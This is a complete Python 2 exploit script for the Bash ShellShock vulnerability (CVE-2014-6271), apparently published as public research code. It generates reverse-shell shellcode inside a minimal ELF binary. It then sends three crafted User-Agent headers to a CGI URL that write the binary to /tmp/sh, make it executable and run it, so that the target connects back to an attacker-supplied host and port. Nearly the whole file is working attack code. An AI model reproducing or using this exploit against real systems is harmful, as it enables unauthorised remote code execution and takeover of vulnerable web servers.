#!/usr/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150401.1
# Licence: WTFPL - wtfpl.net
import requests
import struct
import socket
import sys
__version__ = "20150401.1"

def banner():
    print """\x1b[1;31m
   ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█          ▄████████    ▄█    █▄     ▄██████▄   ▄████████    ▄█   ▄█▄ 
  ███    ███   ███    ███     ███    ███ ███       ███         ███    ███   ███    ███   ███    ███ ███    ███   ███ ▄███▀ 
  ███    █▀    ███    ███     ███    █▀  ███       ███         ███    █▀    ███    ███   ███    ███ ███    █▀    ███▐██▀   
  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███         ███         ▄███▄▄▄▄███▄▄ ███    ███ ███         ▄█████▀    
▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███       ▀███████████ ▀▀███▀▀▀▀███▀  ███    ███ ███        ▀▀█████▄    
         ███   ███    ███     ███    █▄  ███       ███                ███   ███    ███   ███    ███ ███    █▄    ███▐██▄   
   ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄    ▄█    ███   ███    ███   ███    ███ ███    ███   ███ ▀███▄ 
 ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██  ▄████████▀    ███    █▀     ▀██████▀  ████████▀    ███   ▀█▀ 
                                         ▀         ▀                                                             ▀         
               Bash/HTTPd ShellShock Remote Code Execution Exploit, CVE-2014-6271 Version: %s
    \x1b[0m""" %(__version__)


# following shit ganked from bl4sty who is a total boss :)
def u32h(v):
        return struct.pack("<L", v).encode('hex')

def u32(v, hex = False):
        return struct.pack("<L", v)

# Tiny ELF stub based on:
# http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html
def make_elf(sc):
        elf_head = \
                "7f454c46010101000000000000000000" + \
                "02000300010000005480040834000000" + \
                "00000000000000003400200001000000" + \
                "00000000010000000000000000800408" + \
                "00800408" + u32h(0x54+len(sc))*2  + \
                "0500000000100000"

        return elf_head.decode("hex") + sc


def gen_backconnect(cbhost, cbport):
    print "{!} cbhost: " + cbhost
    print "{!} cbport: " + cbport
    cback = \
            "31c031db31c951b10651b10151b10251" + \
            "89e1b301b066cd8089c231c031c95151" + \
            "68badc0ded6668b0efb102665189e7b3" + \
            "1053575289e1b303b066cd8031c939c1" + \
            "740631c0b001cd8031c0b03f89d3cd80" + \
            "31c0b03f89d3b101cd8031c0b03f89d3" + \
            "b102cd8031c031d250686e2f7368682f" + \
            "2f626989e3505389e1b00bcd8031c0b0" + \
            "01cd80"

    cback = cback.replace("badc0ded", socket.inet_aton(cbhost).encode("hex"))
    cback = cback.replace("b0ef", struct.pack(">H", int(cbport)).encode("hex"))
    shellcode = make_elf(cback.decode('hex'))
    tmp = ''.join(["\\x%.2x" % ord(byte) for byte in shellcode])
    shell = tmp.replace("\\", "\\\\")
    return shell


def hacko_el_planito(url, cbhost, cbport):
    print "{+} Dr0psh3llz!"
    useragent = """() { :; }; echo -ne %s>/tmp/sh""" %(gen_backconnect(cbhost, cbport))
    headers = {'User-Agent': useragent}
    r = requests.get(url=url, headers=headers, verify=False)
    print "{*} chmoddin dat bznz"
    useragent2 = """() { :; }; /bin/chmod 777 /tmp/sh"""
    r = requests.get(url=url, headers={'User-Agent': useragent2}, verify=False)
    print "{>} Triggering backconnect!"
    useragent3 = """() { :; }; /tmp/sh"""
    r = requests.get(url=url, headers={'User-Agent': useragent3}, verify=False)

if __name__ == "__main__":
    banner()
    if len(sys.argv) != 4:
        sys.exit("Usage: %s http://example.com/cgi-bin/vuln hacki.ng 1337" %(sys.argv[0]))
    hacko_el_planito(url=sys.argv[1], cbhost=sys.argv[2], cbport=sys.argv[3])
